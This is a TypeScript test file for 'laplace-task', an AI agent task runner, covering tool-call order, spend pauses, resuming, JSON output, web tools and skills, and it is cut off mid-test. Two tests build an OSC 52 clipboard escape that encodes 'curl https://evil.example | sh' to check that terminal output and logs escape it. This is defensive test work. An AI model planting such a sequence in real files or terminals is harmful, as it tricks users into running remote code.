import "../../../packages/config/test/isolated-guard.ts";
import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import {
  readSnapshot,
  skillSwitchesPath,
  type TaskSnapshot,
  tasksDir,
  writeSnapshot,
} from "@eidolon/assistant";
import { dataHome, sharedSkillsDir } from "@eidolon/config";
import { acquireLock, LockedError } from "@eidolon/config/lock";
import type { createMind, MindChunk, MindRequest, MindToolCall, TaskEntry } from "@eidolon/engine";
import {
  ProviderConfigError,
  ProviderHttpError,
  reportUsage,
  type UsageRecord,
} from "@eidolon/providers";
import { ArgparseExit } from "../src/argparse.ts";
import { parseTaskArgs, taskMain } from "../src/task.ts";
import { blockNetwork, captureIo, captureLogs, setEnv } from "./helpers.ts";

blockNetwork();

type Turn = readonly MindChunk[] | ((request: MindRequest) => AsyncIterable<MindChunk>);

const DONE: MindChunk = { type: "done", finishReason: "stop" };

function says(text: string): MindChunk[] {
  return [{ type: "text", text }, DONE];
}

function calls(made: readonly MindToolCall[], text = ""): MindChunk[] {
  return [
    ...(text === "" ? [] : [{ type: "text", text } as const]),
    { type: "tool-calls", calls: made },
    { type: "done", finishReason: "tool_calls" },
  ];
}

function call(id: string, name: string, args: Record<string, unknown>): MindToolCall {
  return { id, name, arguments: args };
}

/**
 * A createMind whose minds answer the task's requests from `turns`, each billing `costUsd` as the
 * assistant through @eidolon/providers, so the record reaches the command's meter as a real one would.
 * A null cost, for a model the catalog doesn't price, leaves the record unpriced; "unreported" bills
 * nothing, as a server that sends no usage.
 */
function scripted(turns: readonly Turn[], costUsd: number | null | "unreported" = 0) {
  const made: { role: string; options: Parameters<typeof createMind>[1] }[] = [];
  const requests: MindRequest[] = [];
  const records: UsageRecord[] = [];
  const factory: typeof createMind = (role = "mind", options = {}) => {
    made.push({ role, options });
    return {
      async *stream(request: MindRequest): AsyncGenerator<MindChunk> {
        const turn = turns[requests.length] ?? says("Done.");
        requests.push(request);
        if (costUsd !== "unreported")
          reportUsage(
            {
              role: "assistant",
              provider: "openrouter",
              model: "test/model",
              units: { inputTokens: 900, cachedTokens: 100, outputTokens: 10 },
              costUsd: costUsd ?? undefined,
            },
            (record) => {
              records.push(record);
              options.tap?.(record);
            },
          );
        if (typeof turn === "function") yield* turn(request);
        else yield* turn;
      },
    };
  };
  return { createMind: factory, made, requests, records };
}

function onlyTask(): { id: string; dir: string } {
  const ids = readdirSync(tasksDir());
  expect(ids).toHaveLength(1);
  const id = ids[0] as string;
  return { id, dir: join(tasksDir(), id) };
}

function transcript(dir: string): TaskEntry[] {
  return readFileSync(join(dir, "transcript.jsonl"), "utf8")
    .trimEnd()
    .split("\n")
    .map((line) => JSON.parse(line) as TaskEntry);
}

/** A SKILL.md in `dir`/`name`; `explicit` opts it out of model use. */
function writeSkill(dir: string, name: string, description: string, explicit = false): void {
  mkdirSync(join(dir, name), { recursive: true });
  const optOut = explicit ? "disable-model-invocation: true\n" : "";
  writeFileSync(
    join(dir, name, "SKILL.md"),
    `---\nname: ${name}\ndescription: ${description}\n${optOut}---\nThe ${name} steps.\n`,
  );
}

let work = "";
let folder = "";
let restoreEnv: () => void = () => {};
let logs!: ReturnType<typeof captureLogs>;

beforeEach(() => {
  work = mkdtempSync(join(tmpdir(), "laplace-task-"));
  folder = join(work, "todo");
  restoreEnv = setEnv({
    ASSISTANT_PROVIDER: "openrouter",
    ASSISTANT_MODEL: "test/model",
    ASSISTANT_FOLDERS: undefined,
    ASSISTANT_SPEND_PAUSE_USD: undefined,
    ASSISTANT_CONTEXT_TOKENS: undefined,
    EIDOLON_APP_ROOT: undefined,
  });
  logs = captureLogs();
});

afterEach(() => {
  logs.stop();
  restoreEnv();
  rmSync(work, { recursive: true, force: true });
  rmSync(tasksDir(), { recursive: true, force: true });
  rmSync(join(dataHome(), "locks"), { recursive: true, force: true });
});

describe("laplace-task", () => {
  test("a scripted task writes its file, keeping every step in its transcript and task.json", async () => {
    // task.json trails the run by the events the command hasn't taken yet.
    let midRun: { spentUsd: number; files: { written: string[] } } | undefined;
    const mind = scripted(
      [
        calls([call("c1", "write", { path: "hello.txt", content: "hi\n" })], "Writing it."),
        async function* () {
          const path = join(tasksDir(), `${readdirSync(tasksDir())[0]}`, "task.json");
          for (let wait = 0; wait < 400 && !midRun?.files.written.length; wait++) {
            midRun = JSON.parse(readFileSync(path, "utf8"));
            await Bun.sleep(5);
          }
          yield* says("Wrote hello.txt.");
        },
      ],
      0.25,
    );
    const io = captureIo();
    const code = await taskMain(["--folder", folder, "Write hello.txt"], {
      ...io.io,
      createMind: mind.createMind,
      confirm: null,
    });

    expect(code).toBe(0);
    const file = join(folder, "hello.txt");
    expect(readFileSync(file, "utf8")).toBe("hi\n");
    const { id, dir } = onlyTask();
    expect(transcript(dir).map((entry) => entry.type)).toEqual([
      "brief",
      "assistant",
      "tool-start",
      "tool-result",
      "assistant",
      "end",
    ]);
    const snapshot = await readSnapshot(dir);
    expect(snapshot).toMatchObject({
      v: 1,
      id,
      status: "succeeded",
      brief: {
        goal: "Write hello.txt",
        deliverable: "Whatever the goal asks for",
        folder,
        check: "The result does what the goal asks",
      },
      model: { account: "openrouter", model: "test/model" },
      grants: [],
      spendPauseUsd: 1,
      spentUsd: 0.5,
      files: { read: [], written: [realpathSync(file)] },
      outcome: { status: "succeeded", report: "Wrote hello.txt." },
    });
    expect(snapshot?.endedAt).toBeNumber();
    // Kept current as the task runs: while it still ran, it held the first request's spend and file.
    expect(midRun?.spentUsd).toBeGreaterThanOrEqual(0.25);
    expect(midRun).toMatchObject({ status: "running", files: { written: [realpathSync(file)] } });
    expect(midRun).not.toHaveProperty("endedAt");

    // The assistant role, with the command's meter as its tap; billed as the task's own.
    expect(mind.made).toEqual([
      {
        role: "assistant",
        options: { tap: expect.any(Function), account: "openrouter", model: "test/model" },
      },
    ]);
    expect(mind.records.map(({ source, session }) => ({ source, session }))).toEqual([
      { source: "task", session: id },
      { source: "task", session: id },
    ]);
    const [first] = mind.requests;
    // skill, for the built-in skills, which every task lists.
    expect(first?.tools.map((tool) => tool.name)).toEqual([
      "read",
      "write",
      "edit",
      "ls",
      "find",
      "grep",
      "skill",
      "todo",
    ]);
    expect(first?.system).toContain("<brief>\nGoal: Write hello.txt\n");
    expect(first?.system).toContain(`<folder>\n${folder}\n</folder>`);

    expect(io.stdout()).toBe(
      `Writing it.\n· write hello.txt\nWrote hello.txt.\n\nTask ${id} succeeded. It wrote:\n` +
        `  ${realpathSync(file)}\n`,
    );
    expect(logs.records).toContainEqual([
      "INFO",
      `Starting task ${id} in ${folder} on openrouter/test/model; its transcript is in ${dir}`,
    ]);
  });

  test("a reply that writes a file and reads it back runs its calls in order, so the read sees the write", async () => {
    // Claude Sonnet 5.5 on OpenRouter sent exactly this, and its read raced the write to ENOENT.
    const mind = scripted([
      calls([
        call("c1", "write", { path: "index.html", content: "<p>hi</p>\n" }),
        call("c2", "read", { path: "index.html" }),
      ]),
      calls([
        call("c3", "edit", { path: "index.html", edits: [{ oldText: "hi", newText: "hello" }] }),
        call("c4", "read", { path: "index.html" }),
      ]),
      says("Done."),
    ]);
    const io = captureIo();
    const code = await taskMain(["--folder", folder, "Write index.html and check it"], {
      ...io.io,
      createMind: mind.createMind,
      confirm: null,
    });

    expect(code).toBe(0);
    const results = transcript(onlyTask().dir).flatMap((entry) =>
      entry.type === "tool-result" ? [entry] : [],
    );
    expect(results.map(({ callId, isError }) => ({ callId, isError }))).toEqual([
      { callId: "c1", isError: false },
      { callId: "c2", isError: false },
      { callId: "c3", isError: false },
      { callId: "c4", isError: false },
    ]);
    expect(results[1]?.content).toContain("<p>hi</p>");
    expect(results[3]?.content).toContain("<p>hello</p>");
  });

  test("shows control characters from the folder or the worker as escapes, not to the terminal", async () => {
    // An OSC 52 clipboard write of "curl https://evil.example | sh", as a cloned repo's file name.
    const osc = "\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\u0007";
    mkdirSync(folder);
    writeFileSync(join(folder, `_${osc}`), "");
    const mind = scripted([
      calls([call("c1", "ls", {})], `Looking\u001b[2K\r.`),
      says(`Done\u009b31m.\n`),
    ]);
    const io = captureIo();
    expect(
      await taskMain(["--folder", folder, "List it"], {
        ...io.io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(0);

    expect(io.stdout()).not.toMatch(/(?![\t\n])\p{Cc}/u);
    expect(io.stdout()).toStartWith(
      "Looking\\u001b[2K\\u000d.\n· ls _\\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\\u0007\n" +
        "Done\\u009b31m.\n",
    );
  });

  test("logs control characters from the folder's path or a provider's error as escapes", async () => {
    const osc = "\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\u0007";
    const escaped = "\\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\\u0007";
    // A folder inside a cloned repo whose directory carries the sequence in its name.
    const named = join(work, `repo_${osc}`);
    const mind = scripted([
      // biome-ignore lint/correctness/useYield: it fails before its first chunk.
      async function* () {
        throw new ProviderHttpError("OpenRouter", 400, `No such model ${osc}`);
      },
    ]);
    expect(
      await taskMain(["--folder", named, "Write hello.txt"], {
        ...captureIo().io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(1);

    const { id, dir } = onlyTask();
    expect(logs.records.filter(([, message]) => /(?![\t\n])\p{Cc}/u.test(message))).toEqual([]);
    expect(logs.records).toContainEqual([
      "INFO",
      `Starting task ${id} in ${join(work, `repo_${escaped}`)} on openrouter/test/model; ` +
        `its transcript is in ${dir}`,
    ]);
    expect(logs.records).toContainEqual([
      "WARNING",
      `The task's request failed: OpenRouter answered 400: No such model ${escaped}`,
    ]);
  });

  test("--json writes the task's events to stdout as JSON lines, and nothing else", async () => {
    const mind = scripted([
      calls([call("c1", "write", { path: "hello.txt", content: "hi\n" })], "Writing it."),
      says("Wrote hello.txt."),
    ]);
    const io = captureIo();
    const writes = spyOn(process.stdout, "write");
    let code: number;
    try {
      code = await taskMain(["--json", "--folder", folder, "Write hello.txt"], {
        ...io.io,
        createMind: mind.createMind,
      });
    } finally {
      writes.mockRestore();
    }

    expect(code).toBe(0);
    expect(writes).not.toHaveBeenCalled();
    const { id, dir } = onlyTask();
    expect(io.stdout()).toEndWith("}\n");
    const events = io
      .stdout()
      .trimEnd()
      .split("\n")
      .map(
        (line) => JSON.parse(line) as { readonly type: string; readonly [field: string]: unknown },
      );
    expect(events[0]).toEqual({
      type: "task",
      id,
      dir,
      folder,
      model: { account: "openrouter", model: "test/model" },
      resumed: false,
    });
    expect(events.at(-1)).toEqual({
      type: "outcome",
      id,
      outcome: { status: "succeeded", report: "Wrote hello.txt." },
      spentUsd: 0,
      written: [realpathSync(join(folder, "hello.txt"))],
    });
    expect(new Set(events.map((event) => event.type))).toEqual(
      new Set(["task", "run", "turn", "request", "delta", "entry", "tool", "outcome"]),
    );
    // Each stored entry, as the transcript holds it.
    const entries = events.flatMap((event) =>
      event.type === "entry" ? [event.entry as TaskEntry] : [],
    );
    expect(entries).toEqual(transcript(dir).slice(1));
  });

  test("a spend pause exits 3 with the command that resumes it, and --resume goes on", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.5" });
    try {
      const first = scripted([calls([call("c1", "write", { path: "a.txt", content: "a" })])], 0.6);
      const paused = captureIo();
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...paused.io,
          createMind: first.createMind,
          confirm: null,
        }),
      ).toBe(3);
      const { id, dir } = onlyTask();
      expect(paused.stdout()).toEndWith(
        `\nTask ${id} paused: Spent $0.60; it pauses at every $0.50.\n` +
          `Resume it with: bun run laplace-task --resume ${id}\n`,
      );
      const stopped = await readSnapshot(dir);
      expect(stopped).toMatchObject({
        status: "paused",
        spentUsd: 0.6,
        spendPauseUsd: 0.5,
        outcome: { status: "paused", reason: "spend" },
      });
      expect(stopped?.endedAt).toBeUndefined();

      const second = scripted([says("All done.")], 0.1);
      const resumed = captureIo();
      expect(
        await taskMain(["--resume", id], {
          ...resumed.io,
          createMind: second.createMind,
          confirm: null,
        }),
      ).toBe(0);
      expect(second.made[0]?.options).toMatchObject({
        account: "openrouter",
        model: "test/model",
      });
      // The resumed run's context is rebuilt from the transcript: the brief, the call, its result.
      const messages = second.requests[0]?.messages as { role: string; content?: string }[];
      expect(messages.map((message) => message.role)).toEqual(["user", "assistant", "tool"]);
      expect(messages[2]?.content).toBe("Successfully wrote to a.txt");
      expect(transcript(dir).map((entry) => entry.type)).toEqual([
        "brief",
        "assistant",
        "tool-start",
        "tool-result",
        "pause",
        "resume",
        "assistant",
        "end",
      ]);
      const done = await readSnapshot(dir);
      expect(done).toMatchObject({
        status: "succeeded",
        files: { written: [realpathSync(join(folder, "a.txt"))] },
        outcome: { status: "succeeded", report: "All done." },
      });
      expect(done?.spentUsd).toBeCloseTo(0.7, 10);
      expect(logs.records).toContainEqual([
        "INFO",
        `Resuming task ${id} in ${folder} on openrouter/test/model; its transcript is in ${dir}`,
      ]);
    } finally {
      restore();
    }
  });

  test("in a terminal, a spend pause asks to go on: yes goes on in-process, no exits 3", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.5" });
    try {
      const write = calls([call("c1", "write", { path: "a.txt", content: "a" })]);
      const asked: string[] = [];
      const yes = scripted([write, says("Done.")], 0.6);
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: yes.createMind,
          confirm: async (question) => {
            asked.push(question);
            return true;
          },
        }),
      ).toBe(0);
      expect(asked).toEqual(["Spent $0.60; it pauses at every $0.50. Continue? [y/N] "]);
      const { dir } = onlyTask();
      expect(transcript(dir).map((entry) => entry.type)).toEqual([
        "brief",
        "assistant",
        "tool-start",
        "tool-result",
        "pause",
        "resume",
        "assistant",
        "end",
      ]);
      expect(yes.made).toHaveLength(1);
      rmSync(tasksDir(), { recursive: true, force: true });

      const no = scripted([write, says("Done.")], 0.6);
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: no.createMind,
          confirm: async () => false,
        }),
      ).toBe(3);
      expect((await readSnapshot(onlyTask().dir))?.status).toBe("paused");
      rmSync(tasksDir(), { recursive: true, force: true });

      // Whatever spawned a --json run reads its events, and is never asked.
      const json = scripted([write, says("Done.")], 0.6);
      expect(
        await taskMain(["--json", "--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: json.createMind,
          confirm: async () => {
            throw new Error("asked");
          },
        }),
      ).toBe(3);
    } finally {
      restore();
    }
  });

  test("a model whose spend can't be counted pauses after its first request, unless pauses are off", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
    // Different calls each turn, so no stall pause steps in.
    const turns = () => [
      ...["a", "b", "c"].map((name) =>
        calls([call(name, "write", { path: `${name}.txt`, content: name })]),
      ),
      says("Done."),
    ];
    const detail =
      "No price is known for test/model at openrouter, so its spend can't count toward the pause at every $0.01.";
    try {
      const paused = scripted(turns(), null);
      const io = captureIo();
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...io.io,
          createMind: paused.createMind,
          confirm: null,
        }),
      ).toBe(3);
      // The reply's calls ran; the pause comes before the next request.
      expect(paused.requests).toHaveLength(1);
      expect(readFileSync(join(folder, "a.txt"), "utf8")).toBe("a");
      const { id, dir } = onlyTask();
      expect(io.stdout()).toEndWith(
        `\nTask ${id} paused: ${detail}\nResume it with: bun run laplace-task --resume ${id}\n`,
      );
      expect(await readSnapshot(dir)).toMatchObject({
        status: "paused",
        spendPauseUsd: 0.01,
        outcome: { status: "paused", reason: "unpriced", detail },
      });
      rmSync(tasksDir(), { recursive: true, force: true });

      // In a terminal it asks, and goes on without pauses on yes, which task.json keeps.
      const asked: string[] = [];
      const yes = scripted(turns(), null);
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: yes.createMind,
          confirm: async (question) => {
            asked.push(question);
            return true;
          },
        }),
      ).toBe(0);
      expect(asked).toEqual([`${detail} Continue without spend pauses? [y/N] `]);
      expect(yes.requests).toHaveLength(4);
      const done = onlyTask().dir;
      expect(transcript(done).find((entry) => entry.type === "pause")).toMatchObject({
        reason: "unpriced",
        detail,
      });
      expect(await readSnapshot(done)).toMatchObject({ status: "succeeded", spendPauseUsd: 0 });
      rmSync(tasksDir(), { recursive: true, force: true });
    } finally {
      restore();
    }
    const unpaused = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0" });
    try {
      const off = scripted(turns(), null);
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...captureIo().io,
          createMind: off.createMind,
          confirm: null,
        }),
      ).toBe(0);
    } finally {
      unpaused();
    }
  });

  test("a request that ends with no usage reported pauses as an unpriced one does", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
    try {
      // A server that ignores stream_options.include_usage.
      const silent = scripted(
        [calls([call("a", "write", { path: "a.txt", content: "a" })]), says("Done.")],
        "unreported",
      );
      const io = captureIo();
      expect(
        await taskMain(["--folder", folder, "Write a.txt"], {
          ...io.io,
          createMind: silent.createMind,
          confirm: null,
        }),
      ).toBe(3);
      expect(silent.requests).toHaveLength(1);
      expect(readFileSync(join(folder, "a.txt"), "utf8")).toBe("a");
      const why = "No usage was reported for test/model at openrouter";
      expect(io.stdout()).toContain(
        `paused: ${why}, so its spend can't count toward the pause at every $0.01.\n`,
      );
      expect(logs.records).toContainEqual([
        "WARNING",
        `${why}, so the task's spend pauses can't count it`,
      ]);
    } finally {
      restore();
    }
  });

  test("a reply whose calls all fail before running pauses too, as --json's unpriced outcome", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
    try {
      // A write with no content fails validation and never runs.
      const failing = scripted(
        [calls([call("a", "write", { path: "a.txt" })]), says("Never asked.")],
        null,
      );
      const io = captureIo();
      expect(
        await taskMain(["--json", "--folder", folder, "Write a.txt"], {
          ...io.io,
          createMind: failing.createMind,
          confirm: async () => {
            throw new Error("asked");
          },
        }),
      ).toBe(3);
      expect(failing.requests).toHaveLength(1);
      expect(existsSync(join(folder, "a.txt"))).toBe(false);
      const last = JSON.parse(io.stdout().trimEnd().split("\n").at(-1) ?? "null");
      expect(last).toMatchObject({
        type: "outcome",
        outcome: {
          status: "paused",
          reason: "unpriced",
          detail:
            "No price is known for test/model at openrouter, so its spend can't count toward the pause at every $0.01.",
        },
      });
    } finally {
      restore();
    }
  });

  test("--resume takes back from the transcript the files a crash kept out of task.json", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.5" });
    try {
      const first = scripted([calls([call("c1", "write", { path: "a.txt", content: "a" })])], 0.6);
      const io = { ...captureIo().io, createMind: first.createMind, confirm: null };
      expect(await taskMain(["--folder", folder, "Write a.txt"], io)).toBe(3);
      const { id, dir } = onlyTask();
      const paused = await readSnapshot(dir);
      if (paused === null) throw new Error("no task.json");
      expect(paused.files.written).toHaveLength(1);
      // As a crash between the result's entry and task.json leaves it.
      await writeSnapshot(dir, { ...paused, files: { read: [], written: [] } });

      const second = scripted([says("All done.")], 0.1);
      const again = { ...captureIo().io, createMind: second.createMind, confirm: null };
      expect(await taskMain(["--resume", id], again)).toBe(0);
      expect((await readSnapshot(dir))?.files.written).toEqual(paused.files.written);
    } finally {
      restore();
    }
  });

  test("going on without spend pauses keeps them off, so a --resume doesn't ask again", async () => {
    const restore = setEnv({ ASSISTANT_SPEND_PAUSE_USD: "0.01" });
    try {
      const asked: string[] = [];
      const first = scripted(
        [
          calls([call("a", "write", { path: "a.txt", content: "a" })]),
          // biome-ignore lint/correctness/useYield: it fails before its first chunk.
          async function* () {
            throw new ProviderHttpError("OpenRouter", 400, "No such model");
          },
        ],
        null,
      );
      expect(
        await taskMain(["--folder", folder, "Write a.txt and b.txt"], {
          ...captureIo().io,
          createMind: first.createMind,
          confirm: async (question) => {
            asked.push(question);
            return true;
          },
        }),
      ).toBe(1);
      expect(asked).toHaveLength(1);
      const { id, dir } = onlyTask();
      expect(await readSnapshot(dir)).toMatchObject({ status: "failed", spendPauseUsd: 0 });

      const again = scripted(
        [calls([call("b", "write", { path: "b.txt", content: "b" })]), says("Done.")],
        null,
      );
      expect(
        await taskMain(["--resume", id], {
          ...captureIo().io,
          createMind: again.createMind,
          confirm: async () => {
            throw new Error("asked");
          },
        }),
      ).toBe(0);
      expect(again.requests).toHaveLength(2);
      expect(readFileSync(join(folder, "b.txt"), "utf8")).toBe("b");
    } finally {
      restore();
    }
  });

  test("a retried reply starts on a line of its own", async () => {
    const mind = scripted([
      // Words, then no finish reason: a failed attempt, which the loop retries.
      [{ type: "text", text: "I'll create index.html." }],
      calls(
        [call("c1", "write", { path: "index.html", content: "<p>hi</p>\n" })],
        "I'll create index.html.",
      ),
      says("Done."),
    ]);
    const io = captureIo();
    expect(
      await taskMain(["--folder", folder, "Write index.html"], {
        ...io.io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(0);
    expect(io.stdout()).toStartWith(
      "I'll create index.html.\nI'll create index.html.\n· write index.html\nDone.\n",
    );
    expect(logs.records).toContainEqual([
      "WARNING",
      "The task's request failed; retrying in 1 s: The model's reply ended with no finish reason",
    ]);
  }, 10_000);

  test("a request that fails for good fails the task, which exits 1 and can be resumed", async () => {
    const mind = scripted([
      // biome-ignore lint/correctness/useYield: it fails before its first chunk.
      async function* () {
        throw new ProviderHttpError("OpenRouter", 400, "No such model");
      },
    ]);
    const io = captureIo();
    expect(
      await taskMain(["--folder", folder, "Write hello.txt"], {
        ...io.io,
        createMind: mind.createMind,
        confirm: null,
      }),
    ).toBe(1);
    const { id, dir } = onlyTask();
    const error = "OpenRouter answered 400: No such model";
    expect(io.stdout()).toBe(
      `\nTask ${id} failed: ${error}\nResume it with: bun run laplace-task --resume ${id}\n`,
    );
    expect(await readSnapshot(dir)).toMatchObject({
      status: "failed",
      outcome: { status: "failed", error },
    });
    expect(logs.records).toContainEqual(["WARNING", `The task's request failed: ${error}`]);
  });

  test("--web any offers web_fetch, which --resume keeps until --web off takes it away", async () => {
    // Each run's one request fails for good, so the task can be resumed again.
    const failing = () =>
      scripted([
        // biome-ignore lint/correctness/useYield: it fails before its first chunk.
        async function* () {
          throw new ProviderHttpError("OpenRouter", 400, "No such model");
        },
      ]);
    const run = (argv: readonly string[], mind: ReturnType<typeof scripted>) =>
      taskMain(argv, { ...captureIo().io, createMind: mind.createMind, confirm: null });
    const offered = (mind: ReturnType<typeof scripted>) =>
      mind.requests[0]?.tools.map((tool) => tool.name);

    const first = failing();
    expect(await run(["--web", "any", "--folder", folder, "Look it up"], first)).toBe(1);
    expect(offered(first)).toEqual([
      "read",
      "write",
      "edit",
      "ls",
      "find",
      "grep",
      "skill",
      "web_fetch",
      "todo",
    ]);
    expect(first.requests[0]?.system).toContain("\n- web_fetch: ");
    const { id, dir } = onlyTask();
    expect((await readSnapshot(dir))?.web).toEqual({ mode: "any", hosts: [], denied: [] });

    const again = failing();
    expect(await run(["--resume", id], again)).toBe(1);
    expect(offered(again)).toContain("web_fetch");

    const off = scripted([says("Done.")]);
    expect(await run(["--resume", id, "--web", "off"], off)).toBe(0);
    expect(offered(off)).not.toContain("web_fetch");
    expect((await readSnapshot(dir))?.web).toEqual({ mode: "off", hosts: [], denied: [] });
  });

  test("without --web there is no web_fetch, nor on resuming the task", async () => {
    const first = scripted([
      // biome-ignore lint/correctness/useYield: it fails before its first chunk.
      async function* () {
        throw new ProviderHttpError("OpenRouter", 400, "No such model");
      },
    ]);
    const run = (argv: readonly string[], mind: ReturnType<typeof scripted>) =>
      taskMain(argv, { ...captureIo().io, createMind: mind.createMind, confirm: null });
    expect(await run(["--folder", folder, "Look it up"], first)).toBe(1);
    expect(first.requests[0]?.tools.map((tool) => tool.name)).not.toContain("web_fetch");
    const { id, dir } = onlyTask();
    const off = { mode: "off", hosts: [], denied: [] } as const;
    expect((await readSnapshot(dir))?.web).toEqual(off);

    const resumed = scripted([says("Done.")]);
    expect(await run(["--resume", id], resumed)).toBe(0);
    expect(resumed.requests[0]?.tools.map((tool) => tool.name)).not.toContain("web_fetch");
    expect((await readSnapshot(dir))?.web).toEqual(off);
  });

  test("--web any offers web_search once the search role has an account and its key, --web off doesn't", async () => {
    const run = (argv: readonly string[], mind: ReturnType<typeof scripted>) =>
      taskMain(argv, { ...captureIo().io, createMind: mind.createMind, confirm: null });
    const offered = (mind: ReturnType<typeof scripted>) =>
      mind.requests[0]?.tools.map((tool) => tool.name) ?? [];
    const unset = scripted([says("Done.")]);
    expect(await run(["--web", "any", "--folder", folder, "Look it up"], unset)).toBe(0);
    expect(offered(unset)).not.toContain("web_search");

    const restore = setEnv({
      ASSISTANT_SEARCH_PROVIDER: "openrouter",
      ASSISTANT_SEARCH_MODEL: undefined,
      OPENROUTER_API_KEY: "or-test",
    });
    try {
      const searching = scripted([says("Done.")]);
      const second = join(work, "second");
      expect(await run(["--web", "any", "--folder", second, "Look it up"], searching)).toBe(0);
      expect(offered(searching).slice(-3)).toEqual(["web_fetch", "web_search", "todo"]);
      expect(searching.requests[0]?.system).toContain("\n- web_search: ");

      const off = scripted([says("Done.")]);
      const third = join(work, "third");
      expect(await run(["--web", "off", "--folder", third, "Look it up"], off)).toBe(0);
      expect(offered(off)).not.toContain("web_fetch");
      expect(offered(off)).not.toContain("web_search");
    } finally {
      restore();
    }
  });

  test("laplace-task lists the data home's and the folder's skills, and offers skill after grep", async () => {
    const owner = join(dataHome(), "skills");
    writeSkill(owner, "owner-style", "How the owner likes pages laid out");
    writeSkill(join(folder, ".agents", "skills"), "repo-build", "How this folder builds");
    try {
      const mind = scripted([says("Done.")]);
      const io = captureIo();
      expect(
        await taskMain(["--folder", folder, "Make a page"], {
          ...io.io,
          createMind: mind.createMind,
          confirm: null,
        }),
      ).toBe(0);
      const tools = mind.requests[0]?.tools.map((tool) => tool.name) ?? [];
      expect(tools.slice(5, 7)).toEqual(["grep", "skill"]);
      const system = mind.requests[0]?.system ?? "";
      expect(system).toContain(
        '<skill name="owner-style" from="owner">How the owner likes pages laid out</skill>',
      );
      expect(system).toContain(
        '<skill name="repo-build" from="folder">How this folder builds</skill>',
      );
    } finally {
      rmSync(owner, { recursive: true, force: true });
    }
  });

  test("laplace-task finds the built-in skills too, first in its catalog, and --skill names one", async () => {
    const builtinSkills = join(work, "built-in");
    writeSkill(builtinSkills, "persona-update", "Find a persona's new streams");
    const mind = scripted([says("Done.")]);
    const io = captureIo();
    expect(
      await taskMain(["--folder", folder, "--skill", "persona-update", "Update her"], {
        ...io.io,
        createMind: mind.createMind,
        confirm: null,
        builtinSkills,
      }),
    ).toBe(0);
    const system = mind.requests[0]?.system ?? "";
    expect(system).toContain(
      '<skill name="persona-update" from="builtin">Find a persona\'s new streams</skill>',
    );
    expect(system).toContain(
      `<skill name="persona-update">\nSkill persona-update (built into Eidolon), in ${realpathSync(join(builtinSkills, "persona-update"))}.`,
    );
  });

  test("--skill carries an owner's skill whole in every run's prompt, kept for --resume; one switched off or unknown is a usage error", async () => {
    writeSkill(sharedSkillsDir(), "ship", "Ship a change", true);
    writeSkill(sharedSkillsDir(), "audit", "Audit the change");
    writeFileSync(skillSwitchesPath(dataHome()), JSON.stringify({ disabled: ["audit"] }));
    try {
      // No built-in skills, so the names to choose from are the shared folder's alone.
      const builtinSkills = join(work, "no-built-in-skills");
      const usage = async (argv: string[]) => {
        const io = captureIo();
        const code = await taskMain(argv, { ...io.io, confirm: null, builtinSkills });
        return [code, io.stderr().trim().split("\n").at(-1)];
      };
      expect(await usage(["--folder", folder, "--skill", "nope", "Ship it"])).toEqual([
        2,
        "laplace-task: error: argument --skill: no skill 'nope' (choose from 'ship')",
      ]);
      expect(await usage(["--folder", folder, "--skill", "audit", "Ship it"])).toEqual([
        2,
        "laplace-task: error: argument --skill: 'audit' is switched off in the app's Settings (choose from 'ship')",
      ]);
      const run = (argv: readonly string[], mind: ReturnType<typeof scripted>) =>
        taskMain(argv, { ...captureIo().io, createMind: mind.createMind, confirm: null });
      const carried = (mind: ReturnType<typeof scripted>) => {
        const system = mind.requests[0]?.system ?? "";
        const block = system.slice(system.indexOf("<requested_skills>"));
        return (
          block.startsWith("<requested_skills>\nThe owner asked for these skills") &&
          block.includes('<skill name="ship">') &&
          block.includes("The ship steps.")
        );
      };
      const first = scripted([
        // biome-ignore lint/correctness/useYield: it fails before its first chunk.
        async function* () {
          throw new ProviderHttpError("OpenRouter", 400, "No such model");
        },
      ]);
      expect(await run(["--folder", folder, "--skill", "ship", "Ship it"], first)).toBe(1);
      expect(carried(first)).toBe(true);
      const { id, dir } = onlyTask();
      expect((await readSnapshot(dir))?.skills).toEqual(["ship"]);
      const resumed = scripted([says("Done.")]);
      expect(await run(["--resume", id], resumed)).toBe(0);
      expect(carried(resumed)).toBe(true);
    } finally {
      rmSync(sharedSkillsDir(), { recursive: true, force: true });
      rmSync(skillSwitchesPath(dataHome()), { force: true });
    }
  });

  test("a skills.json that doesn't read switches nothing off, and says so", async () => {
    writeSkill(sharedSkillsDir(), "ship", "Ship a change");
    writeFileSync(skillSwitchesPath(dataHome()), "{");
    try {
      const mind = scripted([says("Done.")]);
      const io = { ...captureIo().io, createMind: mind.createMind, confirm: null };
      expect(await taskMain(["--folder", folder, "Ship it"], io)).toBe(0);
      const warnings = logs.records
